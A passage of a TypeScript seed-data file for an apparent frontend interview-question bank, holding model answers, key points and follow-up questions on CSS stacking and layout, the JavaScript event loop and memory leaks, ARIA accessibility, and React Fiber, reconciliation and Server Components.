      "Implements cleanup process",
      "Uses naming conventions",
    ],
    followUpQuestions: [
      "How do you prevent flag accumulation?",
      "What metrics indicate a flag is ready for cleanup?",
    ],
    relatedTopics: ["ci-cd", "deployment", "testing"],
    source: "seed",
    commonAt: ["Google", "Meta", "Modern tech companies"],
  },
];

// ============================================================================
// CSS & LAYOUT
// ============================================================================

const cssLayoutQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.CSS_LAYOUT,
    difficulty: "senior",
    question:
      "Explain the CSS stacking context. How does z-index work, and what creates a new stacking context?",
    answer: `## Stacking Context Fundamentals

A stacking context is a 3D conceptualization of HTML elements along the z-axis. Elements within a stacking context are painted as a unit.

\`\`\`
Stacking Order (bottom to top):
1. Background and borders of stacking context
2. Negative z-index children
3. Non-positioned, non-floated block elements
4. Non-positioned floated elements
5. Inline elements
6. z-index: 0 or auto (positioned)
7. Positive z-index children
\`\`\`

## What Creates a Stacking Context

\`\`\`css
/* Root element */
html { }

/* Position + z-index */
.positioned { position: relative; z-index: 1; }

/* Fixed/Sticky positioning */
.fixed { position: fixed; }
.sticky { position: sticky; }

/* Flexbox/Grid children with z-index */
.flex-child { z-index: 1; } /* Parent must be flex/grid */

/* Opacity < 1 */
.translucent { opacity: 0.99; }

/* Transform */
.transformed { transform: translateZ(0); }

/* Filter */
.filtered { filter: blur(0); }

/* Isolation */
.isolated { isolation: isolate; }

/* will-change */
.optimized { will-change: transform; }

/* contain */
.contained { contain: layout; }
\`\`\`

## Common Pitfall: Nested Stacking Contexts

\`\`\`html
<div class="parent" style="position: relative; z-index: 1;">
  <div class="child" style="position: relative; z-index: 9999;">
    I can never be above...
  </div>
</div>

<div class="sibling" style="position: relative; z-index: 2;">
  ...this element (parent z-index: 1 < 2)
</div>
\`\`\`

## Debugging Technique

\`\`\`css
/* Use isolation to create predictable stacking */
.modal-container {
  isolation: isolate;
  z-index: 1000;
}

/* Everything inside is relative to this context */
.modal-backdrop { z-index: 1; }
.modal-content { z-index: 2; }
\`\`\``,
    keyPoints: [
      "Understands stacking order rules",
      "Knows what creates new stacking contexts",
      "Can debug z-index issues",
      "Uses isolation property effectively",
    ],
    followUpQuestions: [
      "Why might a modal appear behind other content?",
      "How does transform affect stacking context?",
    ],
    relatedTopics: ["css-positioning", "z-index", "layout"],
    source: "seed",
    commonAt: ["Any frontend role"],
  },
  {
    category: QUESTION_CATEGORIES.CSS_LAYOUT,
    difficulty: "mid",
    question:
      "When would you use CSS Grid vs Flexbox? Explain the key differences and use cases for each.",
    answer: `## Core Difference

- **Flexbox**: One-dimensional (row OR column)
- **Grid**: Two-dimensional (rows AND columns)

## Flexbox: Best For

\`\`\`css
/* Navigation bars */
.nav {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

/* Centering content */
.center {
  display: flex;
  justify-content: center;
  align-items: center;
}

/* Dynamic item distribution */
.card-list {
  display: flex;
  flex-wrap: wrap;
  gap: 1rem;
}
.card { flex: 1 1 300px; } /* Grow/shrink with min-width */
\`\`\`

## Grid: Best For

\`\`\`css
/* Page layouts */
.layout {
  display: grid;
  grid-template:
    "header header" auto
    "sidebar main" 1fr
    "footer footer" auto
    / 250px 1fr;
}

/* Card grids with fixed columns */
.product-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
  gap: 1rem;
}

/* Complex alignment */
.dashboard {
  display: grid;
  grid-template-columns: repeat(12, 1fr);
}
.widget-large { grid-column: span 8; }
.widget-small { grid-column: span 4; }
\`\`\`

## Decision Framework

| Use Case | Flexbox | Grid |
|----------|---------|------|
| Navigation | ✅ | |
| Centering | ✅ | |
| Unknown item count | ✅ | |
| Page layout | | ✅ |
| Card grid (equal sizes) | | ✅ |
| Overlapping elements | | ✅ |
| Both row & column control | | ✅ |

## Combining Both

\`\`\`css
/* Grid for layout, Flexbox for components */
.page {
  display: grid;
  grid-template-columns: 200px 1fr;
}

.header {
  display: flex;
  justify-content: space-between;
}
\`\`\``,
    keyPoints: [
      "Understands 1D vs 2D layout difference",
      "Knows appropriate use cases for each",
      "Can combine Grid and Flexbox effectively",
    ],
    followUpQuestions: [
      "How does subgrid help with nested layouts?",
      "When would you use grid-template-areas?",
    ],
    relatedTopics: ["css-layout", "responsive-design"],
    source: "seed",
    commonAt: ["All frontend roles"],
  },
  {
    category: QUESTION_CATEGORIES.CSS_LAYOUT,
    difficulty: "mid",
    question:
      "What is the Block Formatting Context (BFC) in CSS? How can you use it to solve common layout problems?",
    answer: `## What is BFC?

A Block Formatting Context is a region where block boxes are laid out and floats interact with each other. Elements in a BFC don't affect layout outside it.

## Creating a BFC

\`\`\`css
/* Any of these create a BFC */
.bfc {
  overflow: hidden; /* or auto, scroll */
  display: flow-root; /* Modern, explicit way */
  display: flex;
  display: grid;
  display: inline-block;
  position: absolute;
  position: fixed;
  float: left; /* or right */
  contain: layout;
}
\`\`\`

## Problem 1: Containing Floats

\`\`\`html
<div class="container">
  <div class="float">Floated</div>
  <p>Content...</p>
</div>

<style>
.float { float: left; }

/* ❌ Container collapses (height: 0) */
.container { background: gray; }

/* ✅ BFC contains the float */
.container { display: flow-root; }
</style>
\`\`\`

## Problem 2: Margin Collapse

\`\`\`html
<div class="parent">
  <div class="child">Child with margin</div>
</div>

<style>
.child { margin-top: 20px; }

/* ❌ Margin collapses through parent */
.parent { background: gray; }

/* ✅ BFC prevents margin collapse */
.parent { display: flow-root; }
</style>
\`\`\`

## Problem 3: Float Wrapping

\`\`\`html
<div class="float">Sidebar</div>
<div class="main">Main content wraps around float...</div>

<style>
.float { float: left; width: 200px; }

/* ❌ Main content wraps around float */
.main { }

/* ✅ BFC creates independent block */
.main { display: flow-root; }
</style>
\`\`\`

## Modern Alternative

\`\`\`css
/* Use display: flow-root for explicit BFC */
.container {
  display: flow-root; /* Clear, semantic intent */
}

/* Instead of the clearfix hack */
.clearfix::after {
  content: "";
  display: block;
  clear: both;
}
\`\`\``,
    keyPoints: [
      "Understands BFC purpose and creation",
      "Knows how to contain floats",
      "Can prevent margin collapse",
      "Uses display: flow-root for modern BFC",
    ],
    followUpQuestions: [
      "How does BFC relate to stacking context?",
      "When would overflow: hidden cause problems?",
    ],
    relatedTopics: ["css-layout", "floats", "margins"],
    source: "seed",
    commonAt: ["Senior frontend roles"],
  },
];

// ============================================================================
// JAVASCRIPT EVENT LOOP
// ============================================================================

const jsEventLoopQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.JS_EVENT_LOOP,
    difficulty: "senior",
    question:
      "Explain the JavaScript event loop in detail. What's the difference between microtasks and macrotasks, and how does this affect code execution order?",
    answer: `## Event Loop Architecture

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                       Call Stack                         │
│  (Currently executing synchronous code)                 │
└─────────────────────────────────────────────────────────┘
                          │
                          ┼
┌─────────────────────────────────────────────────────────┐
│                      Event Loop                          │
│  1. Execute all sync code (call stack empty)            │
│  2. Process ALL microtasks                              │
│  3. Render (if needed)                                  │
│  4. Process ONE macrotask                               │
│  5. Repeat                                              │
└─────────────────────────────────────────────────────────┘
         │                              │
         ┼                              ┼
┌─────────────────┐          ┌─────────────────┐
│   Microtask     │          │   Macrotask     │
│     Queue       │          │     Queue       │
│─────────────────│          │─────────────────│
│ • Promise.then  │          │ • setTimeout    │
│ • queueMicrotask│          │ • setInterval   │
│ • MutationObs   │          │ • setImmediate  │
│ • process.next  │          │ • I/O callbacks │
│   (Node.js)     │          │ • UI rendering  │
└─────────────────┘          └─────────────────┘
\`\`\`

## Execution Order Example

\`\`\`javascript
console.log('1'); // Sync

setTimeout(() => console.log('2'), 0); // Macrotask

Promise.resolve().then(() => {
  console.log('3'); // Microtask
  Promise.resolve().then(() => console.log('4')); // Nested microtask
});

queueMicrotask(() => console.log('5')); // Microtask

console.log('6'); // Sync

// Output: 1, 6, 3, 5, 4, 2
// Sync first, then ALL microtasks (including nested), then macrotasks
\`\`\`

## Why This Matters

\`\`\`javascript
// ❌ Can block rendering
function processLargeArray(arr) {
  arr.forEach(item => {
    // Heavy computation
    Promise.resolve().then(() => process(item));
  });
}
// All promises queue as microtasks
// Rendering blocked until ALL complete

// ✅ Allow rendering between chunks
function processLargeArrayBetter(arr) {
  let index = 0;
  
  function processChunk() {
    const chunk = arr.slice(index, index + 100);
    chunk.forEach(process);
    index += 100;
    
    if (index < arr.length) {
      setTimeout(processChunk, 0); // Macrotask - allows render
    }
  }
  
  processChunk();
}
\`\`\`

## requestAnimationFrame

\`\`\`javascript
// rAF runs BEFORE rendering, after microtasks
console.log('1');
requestAnimationFrame(() => console.log('rAF'));
Promise.resolve().then(() => console.log('microtask'));
setTimeout(() => console.log('timeout'), 0);

// Output: 1, microtask, rAF, timeout
// (rAF may vary based on frame timing)
\`\`\``,
    keyPoints: [
      "Understands microtask vs macrotask priority",
      "Knows all microtasks process before next macrotask",
      "Can predict execution order",
      "Understands rendering implications",
    ],
    followUpQuestions: [
      "How does async/await relate to microtasks?",
      "What happens if microtasks keep adding microtasks?",
    ],
    relatedTopics: ["async-javascript", "promises", "performance"],
    source: "seed",
    commonAt: ["Senior frontend roles"],
  },
  {
    category: QUESTION_CATEGORIES.JS_EVENT_LOOP,
    difficulty: "mid",
    question:
      "What are the common causes of memory leaks in JavaScript applications? How would you identify and fix them?",
    answer: `## Common Memory Leak Causes

### 1. Forgotten Event Listeners

\`\`\`typescript
// ❌ Memory leak
useEffect(() => {
  window.addEventListener('resize', handleResize);
  // Missing cleanup!
}, []);

// ✅ Fixed
useEffect(() => {
  window.addEventListener('resize', handleResize);
  return () => window.removeEventListener('resize', handleResize);
}, []);
\`\`\`

### 2. Uncleared Timers

\`\`\`typescript
// ❌ Memory leak
useEffect(() => {
  setInterval(pollData, 1000);
}, []);

// ✅ Fixed
useEffect(() => {
  const id = setInterval(pollData, 1000);
  return () => clearInterval(id);
}, []);
\`\`\`

### 3. Closures Holding References

\`\`\`typescript
// ❌ Large array kept in memory
function createHandler() {
  const largeData = new Array(1000000).fill('x');
  
  return function handler() {
    console.log(largeData.length); // Closure keeps largeData alive
  };
}

// ✅ Only keep what's needed
function createHandler() {
  const largeData = new Array(1000000).fill('x');
  const length = largeData.length; // Extract needed value
  
  return function handler() {
    console.log(length);
  };
}
\`\`\`

### 4. Detached DOM Nodes

\`\`\`typescript
// ❌ DOM node kept in memory
let cachedElement: HTMLElement | null = null;

function cacheElement() {
  cachedElement = document.getElementById('temp');
  document.body.removeChild(cachedElement!);
  // cachedElement still references removed node
}

// ✅ Clear reference
function cleanup() {
  cachedElement = null;
}
\`\`\`

### 5. Forgotten Subscriptions

\`\`\`typescript
// ❌ Memory leak
useEffect(() => {
  const subscription = observable.subscribe(handleData);
}, []);

// ✅ Fixed
useEffect(() => {
  const subscription = observable.subscribe(handleData);
  return () => subscription.unsubscribe();
}, []);
\`\`\`

## Identifying Memory Leaks

\`\`\`javascript
// Chrome DevTools Memory Tab:
// 1. Take heap snapshot before action
// 2. Perform suspected leaky action
// 3. Take another snapshot
// 4. Compare snapshots, look for increasing objects

// Performance Monitor:
// 1. Open Performance Monitor (Cmd+Shift+P > "Show Performance Monitor")
// 2. Watch "JS heap size" over time
// 3. Growing heap = potential leak
\`\`\``,
    keyPoints: [
      "Knows common leak patterns",
      "Implements proper cleanup in effects",
      "Can use DevTools for leak detection",
      "Understands closure memory implications",
    ],
    followUpQuestions: [
      "How do WeakMap and WeakRef help with memory?",
      "What about memory leaks in Web Workers?",
    ],
    relatedTopics: ["performance", "debugging", "react-hooks"],
    source: "seed",
    commonAt: ["Performance-focused roles"],
  },
];

// ============================================================================
// ACCESSIBILITY
// ============================================================================

const accessibilityQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.ACCESSIBILITY,
    difficulty: "senior",
    question:
      "How would you make a custom dropdown/select component fully accessible? Consider keyboard navigation, screen readers, and ARIA attributes.",
    answer: `## Accessible Custom Select Implementation

### Required ARIA Attributes

\`\`\`tsx
function CustomSelect({ options, value, onChange, label }: Props) {
  const [isOpen, setIsOpen] = useState(false);
  const [activeIndex, setActiveIndex] = useState(-1);
  const listboxId = useId();
  const labelId = useId();
  
  return (
    <div className="select-container">
      <label id={labelId}>{label}</label>
      
      {/* Trigger button */}
      <button
        role="combobox"
        aria-haspopup="listbox"
        aria-expanded={isOpen}
        aria-labelledby={labelId}
        aria-controls={listboxId}
        aria-activedescendant={
          activeIndex >= 0 ? \`option-\${activeIndex}\` : undefined
        }
        onClick={() => setIsOpen(!isOpen)}
        onKeyDown={handleKeyDown}
      >
        {value || 'Select an option'}
      </button>
      
      {/* Options list */}
      {isOpen && (
        <ul
          id={listboxId}
          role="listbox"
          aria-labelledby={labelId}
          tabIndex={-1}
        >
          {options.map((option, index) => (
            <li
              key={option.value}
              id={\`option-\${index}\`}
              role="option"
              aria-selected={option.value === value}
              className={index === activeIndex ? 'active' : ''}
              onClick={() => {
                onChange(option.value);
                setIsOpen(false);
              }}
            >
              {option.label}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}
\`\`\`

### Keyboard Navigation

\`\`\`typescript
function handleKeyDown(e: React.KeyboardEvent) {
  switch (e.key) {
    case 'Enter':
    case ' ':
      e.preventDefault();
      if (isOpen && activeIndex >= 0) {
        onChange(options[activeIndex].value);
        setIsOpen(false);
      } else {
        setIsOpen(true);
      }
      break;
      
    case 'ArrowDown':
      e.preventDefault();
      if (!isOpen) {
        setIsOpen(true);
      } else {
        setActiveIndex(prev => 
          Math.min(prev + 1, options.length - 1)
        );
      }
      break;
      
    case 'ArrowUp':
      e.preventDefault();
      setActiveIndex(prev => Math.max(prev - 1, 0));
      break;
      
    case 'Escape':
      setIsOpen(false);
      break;
      
    case 'Home':
      e.preventDefault();
      setActiveIndex(0);
      break;
      
    case 'End':
      e.preventDefault();
      setActiveIndex(options.length - 1);
      break;
      
    default:
      // Type-ahead: jump to option starting with typed letter
      handleTypeAhead(e.key);
  }
}
\`\`\`

### Focus Management

\`\`\`typescript
// Return focus to trigger when closing
useEffect(() => {
  if (!isOpen) {
    buttonRef.current?.focus();
  }
}, [isOpen]);

// Close on outside click
useEffect(() => {
  if (!isOpen) return;
  
  function handleClickOutside(e: MouseEvent) {
    if (!containerRef.current?.contains(e.target as Node)) {
      setIsOpen(false);
    }
  }
  
  document.addEventListener('mousedown', handleClickOutside);
  return () => document.removeEventListener('mousedown', handleClickOutside);
}, [isOpen]);
\`\`\`

### Screen Reader Announcements

\`\`\`tsx
// Live region for announcements
<div aria-live="polite" className="sr-only">
  {isOpen && \`\${options.length} options available\`}
</div>

// Selected state clearly communicated
<li
  role="option"
  aria-selected={isSelected}
>
  {option.label}
  {isSelected && <span className="sr-only">(selected)</span>}
</li>
\`\`\``,
    keyPoints: [
      "Knows required ARIA roles and attributes",
      "Implements full keyboard navigation",
      "Manages focus correctly",
      "Provides screen reader announcements",
    ],
    followUpQuestions: [
      "How would you handle multi-select?",
      "What about typeahead/autocomplete behavior?",
    ],
    relatedTopics: ["aria", "keyboard-navigation", "focus-management"],
    source: "seed",
    commonAt: ["Any company caring about a11y"],
  },
  {
    category: QUESTION_CATEGORIES.ACCESSIBILITY,
    difficulty: "mid",
    question:
      "What is the difference between aria-label, aria-labelledby, and aria-describedby? When would you use each?",
    answer: `## Purpose and Differences

### aria-label
Provides an accessible name directly as a string.

\`\`\`html
<!-- Icon-only button -->
<button aria-label="Close dialog">
  <svg><!-- X icon --></svg>
</button>

<!-- When visible text is insufficient -->
<button aria-label="Add to cart - Blue T-Shirt, $29.99">
  Add to Cart
</button>
\`\`\`

### aria-labelledby
Points to element(s) that provide the accessible name.

\`\`\`html
<!-- Reference existing text -->
<h2 id="dialog-title">Delete Account</h2>
<div role="dialog" aria-labelledby="dialog-title">
  <!-- dialog content -->
</div>

<!-- Multiple labels -->
<span id="billing">Billing</span>
<span id="name">Name</span>
<input aria-labelledby="billing name" />
<!-- Announced as "Billing Name" -->
\`\`\`

### aria-describedby
Points to element(s) that provide additional description.

\`\`\`html
<!-- Help text for input -->
<label for="password">Password</label>
<input 
  id="password" 
  type="password"
  aria-describedby="password-help password-error"
/>
<p id="password-help">Must be at least 8 characters</p>
<p id="password-error" role="alert">Password is too short</p>

<!-- Dialog description -->
<div 
  role="dialog"
  aria-labelledby="dialog-title"
  aria-describedby="dialog-desc"
>
  <h2 id="dialog-title">Delete Account</h2>
  <p id="dialog-desc">This action cannot be undone.</p>
</div>
\`\`\`

## Decision Framework

| Scenario | Use |
|----------|-----|
| No visible text (icons) | aria-label |
| Visible text exists | aria-labelledby |
| Need supplementary info | aria-describedby |
| Form validation errors | aria-describedby |
| Combining multiple text sources | aria-labelledby |

## Priority Order

Screen readers use this priority:
1. aria-labelledby (if present)
2. aria-label (if present)
3. Native label mechanisms (<label>, alt, etc.)
4. Element content

\`\`\`html
<!-- aria-labelledby wins -->
<span id="custom">Custom Label</span>
<button aria-labelledby="custom" aria-label="Different">
  Button Text
</button>
<!-- Announced as "Custom Label" -->
\`\`\``,
    keyPoints: [
      "Knows when to use each attribute",
      "Understands priority order",
      "Can combine with aria-describedby",
      "Uses aria-labelledby for existing text",
    ],
    followUpQuestions: [
      "What happens when both aria-label and aria-labelledby are present?",
      "How do you test these with screen readers?",
    ],
    relatedTopics: ["aria", "screen-readers", "forms"],
    source: "seed",
    commonAt: ["All frontend roles"],
  },
];

// ============================================================================
// REACT INTERNALS
// ============================================================================

const reactInternalsQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.REACT_INTERNALS,
    difficulty: "senior",
    question:
      "Explain React's Fiber architecture. What problems did it solve, and how does it enable concurrent rendering?",
    answer: `## Before Fiber: Stack Reconciler

\`\`\`
Old React (synchronous):
render() ─────────────────────────────────► commit
          Can't interrupt! (blocking)

Problem: Large updates block the main thread
- No user input handling during reconciliation
- Janky animations
- Unresponsive UI
\`\`\`

## Fiber Architecture

\`\`\`
With Fiber (interruptible):
render ──► pause ──► handle input ──► resume ──► commit
          │                            │
          └── Work can be interrupted ─┘
\`\`\`

### Fiber Node Structure

\`\`\`typescript
interface Fiber {
  // Instance
  type: any;          // Function/Class/string ('div')
  key: string | null;
  stateNode: any;     // DOM node or class instance
  
  // Fiber tree structure
  return: Fiber | null;     // Parent
  child: Fiber | null;      // First child
  sibling: Fiber | null;    // Next sibling
  
  // Effects
  flags: Flags;             // What needs to happen (Placement, Update, Deletion)
  subtreeFlags: Flags;      // Optimized child effect tracking
  
  // Work
  pendingProps: any;
  memoizedProps: any;
  memoizedState: any;
  
  // Lanes (priority)
  lanes: Lanes;
  childLanes: Lanes;
}
\`\`\`

### Two-Phase Rendering

\`\`\`
Phase 1: Render (interruptible)
┌─────────────────────────────────────────────┐
│  Build work-in-progress Fiber tree          │
│  • Can be paused, aborted, restarted        │
│  • No side effects                          │
│  • Pure calculation of what changed         │
└─────────────────────────────────────────────┘
                    │
                    ┼
Phase 2: Commit (synchronous)
┌─────────────────────────────────────────────┐
│  Apply changes to DOM                        │
│  • Cannot be interrupted                    │
│  • Runs effects (useEffect, useLayoutEffect)│
│  • Must complete in one go                  │
└─────────────────────────────────────────────┘
\`\`\`

## Priority Lanes

\`\`\`typescript
// Different updates have different priorities
const SyncLane = 0b0001;           // Highest (user input)
const InputContinuousLane = 0b0010; // Dragging, scrolling
const DefaultLane = 0b0100;         // Normal updates
const TransitionLane = 0b1000;      // startTransition

// React can interrupt low-priority work for high-priority
function handleClick() {
  // This gets SyncLane - highest priority
  setInputValue(e.target.value);
  
  // This gets TransitionLane - can be interrupted
  startTransition(() => {
    setSearchResults(filterData(query));
  });
}
\`\`\`

## Concurrent Features Enabled

\`\`\`typescript
// 1. Suspense
<Suspense fallback={<Spinner />}>
  <AsyncComponent />
</Suspense>

// 2. Transitions
const [isPending, startTransition] = useTransition();

// 3. Deferred values
const deferredValue = useDeferredValue(value);

// 4. Streaming SSR
renderToPipeableStream(<App />);
\`\`\``,
    keyPoints: [
      "Understands pre-Fiber limitations",
      "Knows Fiber node structure",
      "Can explain two-phase rendering",
      "Understands priority lanes",
      "Knows what concurrent features Fiber enables",
    ],
    followUpQuestions: [
      "How does React decide when to interrupt work?",
      "What is time slicing?",
      "How do transitions differ from regular state updates?",
    ],
    relatedTopics: ["reconciliation", "concurrent-react", "suspense"],
    source: "seed",
    commonAt: ["Meta", "Senior React roles"],
  },
  {
    category: QUESTION_CATEGORIES.REACT_INTERNALS,
    difficulty: "senior",
    question:
      "How does React's reconciliation algorithm work? Explain the diffing heuristics and why keys are important.",
    answer: `## Reconciliation Overview

React's reconciliation compares the old and new virtual DOM trees to determine the minimum DOM operations needed.

### Diffing Heuristics

React uses two heuristics for O(n) complexity:

**1. Different types → Full rebuild**
\`\`\`tsx
// Old tree
<div>
  <Counter />
</div>

// New tree - different root type
<span>
  <Counter />
</span>

// Result: Entire subtree destroyed and rebuilt
// Counter loses all state
\`\`\`

**2. Same type → Update attributes/props**
\`\`\`tsx
// Old
<div className="old" title="old" />

// New
<div className="new" title="new" />

// Result: Only update className and title attributes
// DOM node reused
\`\`\`

### Key Algorithm for Lists

\`\`\`tsx
// Without keys - positional comparison
// Old: [A, B, C]
// New: [B, C, A]
// React thinks: Update A→B, Update B→C, Update C→A
// 3 updates!

// With keys - identity-based comparison  
// Old: [A(key=1), B(key=2), C(key=3)]
// New: [B(key=2), C(key=3), A(key=1)]
// React knows: Move A, keep B and C
// 1 move operation!
\`\`\`

### Why Index as Key is Bad

\`\`\`tsx
// Items: ['Apple', 'Banana', 'Cherry']
// Rendered with index keys

{items.map((item, index) => (
  <ListItem key={index} item={item} />
))}

// Delete 'Apple' - items become ['Banana', 'Cherry']
// 
// Old:  key=0(Apple) | key=1(Banana) | key=2(Cherry)
// New:  key=0(Banana) | key=1(Cherry)
//
// React compares by key:
// - key=0: Apple→Banana (UPDATE, not delete!)
// - key=1: Banana→Cherry (UPDATE)
// - key=2: Cherry→(removed)
//
// Input state in ListItem gets misaligned!
\`\`\`

### Fiber Reconciliation Process

\`\`\`typescript
function reconcileChildren(
  current: Fiber | null,
  workInProgress: Fiber,
  newChildren: any
) {
  // 1. First pass: Match existing children by key
  const existingChildren = mapRemainingChildren(current);
  
  // 2. For each new child:
  for (const newChild of newChildren) {
    // Try to find matching fiber by key
    const existing = existingChildren.get(newChild.key);
    
    if (existing && existing.type === newChild.type) {
      // Reuse fiber, just update props
      const clone = useFiber(existing, newChild.props);
      existingChildren.delete(newChild.key);
    } else {
      // Create new fiber
      createFiberFromElement(newChild);
    }
  }
  
  // 3. Delete remaining unmatched children
  existingChildren.forEach(child => deleteChild(workInProgress, child));
}
\`\`\`

### Key Best Practices

\`\`\`tsx
// ✅ Good: Stable, unique ID
{items.map(item => (
  <Item key={item.id} data={item} />
))}

// ✅ Good: Composite key when no ID
{items.map(item => (
  <Item key={\`\${item.category}-\${item.name}\`} data={item} />
))}

// ❌ Bad: Array index (causes bugs with reordering)
{items.map((item, index) => (
  <Item key={index} data={item} />
))}

// ❌ Bad: Random value (causes full remount every render)
{items.map(item => (
  <Item key={Math.random()} data={item} />
))}
\`\`\``,
    keyPoints: [
      "Understands O(n) heuristics",
      "Knows type comparison rules",
      "Can explain key algorithm in detail",
      "Knows why index keys cause bugs",
    ],
    followUpQuestions: [
      "When might you intentionally use index as key?",
      "How does reconciliation differ with Suspense?",
    ],
    relatedTopics: ["virtual-dom", "fiber", "performance"],
    source: "seed",
    commonAt: ["Meta", "Senior React roles"],
  },
  {
    category: QUESTION_CATEGORIES.REACT_INTERNALS,
    difficulty: "mid",
    question:
      "Explain the difference between React Server Components (RSC) and traditional server-side rendering (SSR). What problems does RSC solve?",
    answer: `## Traditional SSR

\`\`\`
Server                           Client
┌────────────────┐              ┌────────────────┐
│ Render to HTML │ ──────────►  │ Parse HTML     │
│                │              │ (visible)      │
└────────────────┘              └────────────────┘
                                        │
┌────────────────┐              ┌───────┼────────┐
│ Send JS bundle │ ──────────►  │ Download JS    │
│ (entire app)   │              │ (large bundle) │
└────────────────┘              └────────────────┘
                                        │
                                ┌───────┼────────┐
                                │ Hydrate        │
                                │ (interactive)  │
                                └────────────────┘

Problems:
- Full JS bundle downloaded even for static content
- Hydration must complete before interactivity
- Client needs all component code
\`\`\`

## React Server Components

\`\`\`
Server                           Client
┌────────────────┐              ┌────────────────┐
│ Execute RSC    │              │                │
│ (data fetching)│              │                │
└───────┬────────┘              │                │
        │                       │                │
┌───────┼────────┐              │                │
│ Stream RSC     │ ──────────►  │ Render RSC     │
│ payload (JSON) │              │ output         │
└───────┬────────┘              │ (no hydration) │
        │                       │                │
┌───────┼────────┐              ┌────────────────┤
│ Send ONLY      │ ──────────►  │ Hydrate only   │
│ client         │              │ client         │
│ component JS   │              │ components     │
└────────────────┘              └────────────────┘

Benefits:
- Zero JS for server components
- Streaming (progressive loading)
- Direct database/filesystem access
\`\`\`

## Component Types

\`\`\`tsx
// Server Component (default in App Router)
// - Runs only on server
// - Can use async/await
// - Can access database, filesystem
// - Cannot use hooks, browser APIs
async function ProductList() {
  const products = await db.query('SELECT * FROM products');
  
  return (
    <ul>
      {products.map(p => (
        <ProductCard key={p.id} product={p} />
      ))}
    </ul>
  );
}

// Client Component
'use client';
// - Runs on client (and server for SSR)
// - Can use hooks, event handlers
// - Cannot be async
function AddToCartButton({ productId }: { productId: string }) {
  const [isPending, startTransition] = useTransition();
  
  return (
    <button onClick={() => addToCart(productId)}>
      Add to Cart
    </button>
  );
}
\`\`\`

## Composition Pattern

\`\`\`tsx
// Server Component can render Client Components
// but not vice versa (without children pattern)

// ✅ Server renders Client
async function Page() {
  const data = await fetchData();
  return <ClientComponent initialData={data} />;
}

// ✅ Client receives Server children via props
function ClientWrapper({ children }: { children: React.ReactNode }) {
  const [isOpen, setIsOpen] = useState(false);
  return isOpen ? children : null;
}

// Usage
<ClientWrapper>
  <ServerComponent /> {/* This works! */}
</ClientWrapper>
\`\`\`

## When to Use Each

| Server Components | Client Components |
|------------------|-------------------|
| Data fetching | Event handlers |
| Access backend | useState, useEffect |
| Render-only UI | Browser APIs |
| Large dependencies | Interactive UI |
| Sensitive data | Real-time updates |`,
    keyPoints: [
      "Understands SSR vs RSC differences",
      "Knows zero-JS benefit of RSC",
      "Can explain composition patterns",
      "Knows when to use client vs server",
    ],
    followUpQuestions: [
      "How do Server Actions relate to RSC?",
      "What are the caching implications of RSC?",
    ],
    relatedTopics: ["next-js", "ssr", "streaming"],
    source: "seed",
    commonAt: ["Modern React/Next.js roles"],
  },
];

// ============================================================================
// COMBINE ALL QUESTIONS
// ============================================================================

export const ALL_SEED_QUESTIONS: CreateQuestionInput[] = [
  ...systemDesignQuestions,
  ...cachingMemoizationQuestions,
  ...bundleTreeShakingQuestions,
  ...securityAuthQuestions,
  ...featureFlagsQuestions,
  ...cssLayoutQuestions,
  ...jsEventLoopQuestions,
  ...accessibilityQuestions,
  ...reactInternalsQuestions,
];

// Export individual categories for selective seeding
export {
  systemDesignQuestions,
  cachingMemoizationQuestions,
  bundleTreeShakingQuestions,
  securityAuthQuestions,
  featureFlagsQuestions,
  cssLayoutQuestions,
  jsEventLoopQuestions,
  accessibilityQuestions,
  reactInternalsQuestions,
};
